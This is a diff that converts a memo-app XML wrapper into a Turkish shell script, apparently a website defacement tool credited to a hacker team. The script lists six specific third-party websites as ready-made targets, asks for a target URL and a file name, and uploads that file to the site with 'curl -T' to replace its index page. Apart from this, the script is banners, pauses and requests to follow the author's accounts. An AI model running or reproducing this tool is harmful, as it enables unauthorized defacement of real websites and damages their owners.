@@ -1,12 +1,58 @@
-<?xml version="1.0" encoding="UTF-8"?><memo Version="1.0">
-<header>
-<meta title="cache.sh"/>
-<meta favourite="false"/>
-<meta uuid="e401bf2a-0ddc-a8bf-0000-016b5e26d7ba"/>
-<meta createdTime="1560652732346"/>
-</header>
-<contents>
-<content>&lt;p value="memo2" &gt;&lt;/p&gt;&lt;p&gt;&lt;/p&gt;&lt;p&gt;#lu recode gua sumpahin melarat#&lt;/p&gt;&lt;p&gt;&lt;/p&gt;&lt;p&gt;clear&lt;/p&gt;&lt;p&gt;sleep 1&lt;/p&gt;&lt;p&gt;echo "[+] Bekle Dostum..." | lolcat&lt;/p&gt;&lt;p&gt;sleep 3&lt;/p&gt;&lt;p&gt;clear&lt;/p&gt;&lt;p&gt;figlet Hosgeldin | lolcat&lt;/p&gt;&lt;p&gt;sleep 2&lt;/p&gt;&lt;p&gt;clear&lt;/p&gt;&lt;p&gt;echo "_______________________________________________________&lt;/p&gt;&lt;p&gt;&lt;/p&gt;&lt;p&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; [ Araclar ve Web Indexleme]&lt;/p&gt;&lt;p&gt;&lt;/p&gt;&lt;p&gt;[+] Coded&amp;nbsp;&amp;nbsp; : GUL5OY&lt;/p&gt;&lt;p&gt;[+] Team&amp;nbsp;&amp;nbsp;&amp;nbsp; : BLURY HACK TIM/TURK SIBER ORDU&lt;/p&gt;&lt;p&gt;[+] Github&amp;nbsp; : https://github.com/gul5oy&lt;/p&gt;&lt;p&gt;[+] Contact : gul5oy@yandex.com&lt;/p&gt;&lt;p&gt;[+] Youtube : GUL5OY yaz cıkar&lt;/p&gt;&lt;p&gt;&lt;/p&gt;&lt;p&gt;_______________________________________________________" | lolcat&lt;/p&gt;&lt;p&gt;sleep 1&lt;/p&gt;&lt;p&gt;echo "[+] Bekleyin server'a baglaniliyor..." | lolcat&lt;/p&gt;&lt;p&gt;sleep 3&lt;/p&gt;&lt;p&gt;echo "[+] Hedef websiteniz yok ise buradan alabilirsiniz" | lolcat&lt;/p&gt;&lt;p&gt;sleep 2&lt;/p&gt;&lt;p&gt;echo "_____________________________________&lt;/p&gt;&lt;p&gt;&lt;/p&gt;&lt;p&gt;﻿http://africaprop.co.za/&lt;/p&gt;&lt;p&gt;&lt;/p&gt;&lt;p&gt;&amp;nbsp;http://ballastbrokers.co.za/&lt;/p&gt;&lt;p&gt;&lt;/p&gt;&lt;p&gt;&amp;nbsp;http://www.ajaxfilebrowser.com/&lt;/p&gt;&lt;p&gt;&lt;/p&gt;&lt;p&gt;&amp;nbsp;http://hq.prospec.co.th/&lt;/p&gt;&lt;p&gt;&lt;/p&gt;&lt;p&gt;&amp;nbsp;http://branch.prospec.co.th/&lt;/p&gt;&lt;p&gt;&lt;/p&gt;&lt;p&gt;&amp;nbsp;http://bestilling.udir.no&lt;/p&gt;&lt;p&gt;_____________________________________" | lolcat&lt;/p&gt;&lt;p&gt;&lt;/p&gt;&lt;p&gt;echo "[+] Hedef Website : " $target |lolcat&lt;/p&gt;&lt;p&gt;read target&lt;/p&gt;&lt;p&gt;echo "[+] Bekle..." | lolcat&lt;/p&gt;&lt;p&gt;sleep 2&lt;/p&gt;&lt;p&gt;echo "[+] Index'in Kayıtlı Oldugu Isım : " $sc |lolcat&lt;/p&gt;&lt;p&gt;read sc&lt;/p&gt;&lt;p&gt;curl -T /storage/emulated/0/$sc $target&lt;/p&gt;&lt;p&gt;echo "[+] Web Sitesini Kontrol Et .html" | lolcat&lt;/p&gt;&lt;p&gt;sleep 2&lt;/p&gt;&lt;p&gt;echo "[+] Basarılı!! " | lolcat&lt;/p&gt;&lt;p&gt;sleep 20&lt;/p&gt;&lt;p&gt;clear&lt;/p&gt;&lt;p&gt;echo "Instagram hesabımı takip edersen sevinirim" | lolcat&lt;/p&gt;&lt;p&gt;sleep 5&lt;/p&gt;&lt;p&gt;clear&lt;/p&gt;</content>
-<xml_content>&lt;todolist&gt;&lt;todolist_item todo_item_state="false" todo_item_type="0" todo_item_content="&amp;lt;p&amp;gt;&amp;lt;/p&amp;gt;&amp;lt;p&amp;gt;&amp;lt;/p&amp;gt;&amp;lt;p&amp;gt;#lu recode gua sumpahin melarat#&amp;lt;/p&amp;gt;&amp;lt;p&amp;gt;&amp;lt;/p&amp;gt;&amp;lt;p&amp;gt;clear&amp;lt;/p&amp;gt;&amp;lt;p&amp;gt;sleep 1&amp;lt;/p&amp;gt;&amp;lt;p&amp;gt;echo &amp;quot;[+] Bekle Dostum...&amp;quot; | lolcat&amp;lt;/p&amp;gt;&amp;lt;p&amp;gt;sleep 3&amp;lt;/p&amp;gt;&amp;lt;p&amp;gt;clear&amp;lt;/p&amp;gt;&amp;lt;p&amp;gt;figlet Hosgeldin | lolcat&amp;lt;/p&amp;gt;&amp;lt;p&amp;gt;sleep 2&amp;lt;/p&amp;gt;&amp;lt;p&amp;gt;clear&amp;lt;/p&amp;gt;&amp;lt;p&amp;gt;echo &amp;quot;_______________________________________________________&amp;lt;/p&amp;gt;&amp;lt;p&amp;gt;&amp;lt;/p&amp;gt;&amp;lt;p&amp;gt;&amp;amp;nbsp;&amp;amp;nbsp;&amp;amp;nbsp;&amp;amp;nbsp;&amp;amp;nbsp;&amp;amp;nbsp;&amp;amp;nbsp;&amp;amp;nbsp;&amp;amp;nbsp;&amp;amp;nbsp;&amp;amp;nbsp;&amp;amp;nbsp;&amp;amp;nbsp;&amp;amp;nbsp;&amp;amp;nbsp;&amp;amp;nbsp; [ Araclar ve Web Indexleme]&amp;lt;/p&amp;gt;&amp;lt;p&amp;gt;&amp;lt;/p&amp;gt;&amp;lt;p&amp;gt;[+] Coded&amp;amp;nbsp;&amp;amp;nbsp; : GUL5OY&amp;lt;/p&amp;gt;&amp;lt;p&amp;gt;[+] Team&amp;amp;nbsp;&amp;amp;nbsp;&amp;amp;nbsp; : BLURY HACK TIM/TURK SIBER ORDU&amp;lt;/p&amp;gt;&amp;lt;p&amp;gt;[+] Github&amp;amp;nbsp; : https://github.com/gul5oy&amp;lt;/p&amp;gt;&amp;lt;p&amp;gt;[+] Contact : gul5oy@yandex.com&amp;lt;/p&amp;gt;&amp;lt;p&amp;gt;[+] Youtube : GUL5OY yaz cıkar&amp;lt;/p&amp;gt;&amp;lt;p&amp;gt;&amp;lt;/p&amp;gt;&amp;lt;p&amp;gt;_______________________________________________________&amp;quot; | lolcat&amp;lt;/p&amp;gt;&amp;lt;p&amp;gt;sleep 1&amp;lt;/p&amp;gt;&amp;lt;p&amp;gt;echo &amp;quot;[+] Bekleyin server&amp;apos;a baglaniliyor...&amp;quot; | lolcat&amp;lt;/p&amp;gt;&amp;lt;p&amp;gt;sleep 3&amp;lt;/p&amp;gt;&amp;lt;p&amp;gt;echo &amp;quot;[+] Hedef websiteniz yok ise buradan alabilirsiniz&amp;quot; | lolcat&amp;lt;/p&amp;gt;&amp;lt;p&amp;gt;sleep 2&amp;lt;/p&amp;gt;&amp;lt;p&amp;gt;echo &amp;quot;_____________________________________&amp;lt;/p&amp;gt;&amp;lt;p&amp;gt;&amp;lt;/p&amp;gt;&amp;lt;p&amp;gt;﻿http://africaprop.co.za/&amp;lt;/p&amp;gt;&amp;lt;p&amp;gt;&amp;lt;/p&amp;gt;&amp;lt;p&amp;gt;&amp;amp;nbsp;http://ballastbrokers.co.za/&amp;lt;/p&amp;gt;&amp;lt;p&amp;gt;&amp;lt;/p&amp;gt;&amp;lt;p&amp;gt;&amp;amp;nbsp;http://www.ajaxfilebrowser.com/&amp;lt;/p&amp;gt;&amp;lt;p&amp;gt;&amp;lt;/p&amp;gt;&amp;lt;p&amp;gt;&amp;amp;nbsp;http://hq.prospec.co.th/&amp;lt;/p&amp;gt;&amp;lt;p&amp;gt;&amp;lt;/p&amp;gt;&amp;lt;p&amp;gt;&amp;amp;nbsp;http://branch.prospec.co.th/&amp;lt;/p&amp;gt;&amp;lt;p&amp;gt;&amp;lt;/p&amp;gt;&amp;lt;p&amp;gt;&amp;amp;nbsp;http://bestilling.udir.no&amp;lt;/p&amp;gt;&amp;lt;p&amp;gt;_____________________________________&amp;quot; | lolcat&amp;lt;/p&amp;gt;&amp;lt;p&amp;gt;&amp;lt;/p&amp;gt;&amp;lt;p&amp;gt;echo &amp;quot;[+] Hedef Website : &amp;quot; $target |lolcat&amp;lt;/p&amp;gt;&amp;lt;p&amp;gt;read target&amp;lt;/p&amp;gt;&amp;lt;p&amp;gt;echo &amp;quot;[+] Bekle...&amp;quot; | lolcat&amp;lt;/p&amp;gt;&amp;lt;p&amp;gt;sleep 2&amp;lt;/p&amp;gt;&amp;lt;p&amp;gt;echo &amp;quot;[+] Index&amp;apos;in Kayıtlı Oldugu Isım : &amp;quot; $sc |lolcat&amp;lt;/p&amp;gt;&amp;lt;p&amp;gt;read sc&amp;lt;/p&amp;gt;&amp;lt;p&amp;gt;curl -T /storage/emulated/0/$sc $target&amp;lt;/p&amp;gt;&amp;lt;p&amp;gt;echo &amp;quot;[+] Web Sitesini Kontrol Et .html&amp;quot; | lolcat&amp;lt;/p&amp;gt;&amp;lt;p&amp;gt;sleep 2&amp;lt;/p&amp;gt;&amp;lt;p&amp;gt;echo &amp;quot;[+] Basarılı!! &amp;quot; | lolcat&amp;lt;/p&amp;gt;&amp;lt;p&amp;gt;sleep 20&amp;lt;/p&amp;gt;&amp;lt;p&amp;gt;clear&amp;lt;/p&amp;gt;&amp;lt;p&amp;gt;echo &amp;quot;Instagram hesabımı takip edersen sevinirim&amp;quot; | lolcat&amp;lt;/p&amp;gt;&amp;lt;p&amp;gt;sleep 5&amp;lt;/p&amp;gt;&amp;lt;p&amp;gt;clear&amp;lt;/p&amp;gt;"/&gt;&lt;/todolist&gt;</xml_content>
-</contents>
-</memo>
+
+
+#lu recode gua sumpahin melarat#
+
+clear
+sleep 1
+echo "[+] Bekle Dostum..." | lolcat
+sleep 3
+clear
+figlet Hosgeldin | lolcat
+sleep 2
+clear
+echo "_______________________________________________________
+
+                 [Adresler ve Araclar ]
+
+[+] Kodlayıcı : GUL5OY
+[+] Takım    : BLURY HACK TIM
+[+] Github  : https://github.com/gul5oy
+[+] Iletisim : gul5oy@yandex.com
+[+] Instagram : www.instagram.com/gul5oy
+
+_______________________________________________________" | lolcat
+sleep 1
+echo "[+] Bekleyin Server'a Baglanılıyor..." | lolcat
+sleep 3
+echo "[+] Hedef Siteniz Yok Ise Buradan Kullanabilirsiniz." | lolcat
+sleep 2
+echo "_____________________________________
+
+﻿http://africaprop.co.za/
+
+ http://ballastbrokers.co.za/
+
+ http://www.ajaxfilebrowser.com/
+
+ http://hq.prospec.co.th/
+
+ http://branch.prospec.co.th/
+
+ http://bestilling.udir.no
+_____________________________________" | lolcat
+
+echo "[+] Hedef Website : " $target |lolcat
+read target
+echo "[+]Bekle..." | lolcat
+sleep 2
+echo "[+] Index'in kayıtlı oldugu isim? : " $sc |lolcat
+read sc
+curl -T /storage/emulated/0/$sc $target
+echo "[+] Hedef siteyi kontrol et .html" | lolcat
+sleep 2
+echo "[+] Basarılı!! " | lolcat
+sleep 20
+clear
+echo "Instagram hesabımdan bana ulasabilirsiniz." | lolcat
+sleep 5
+clear
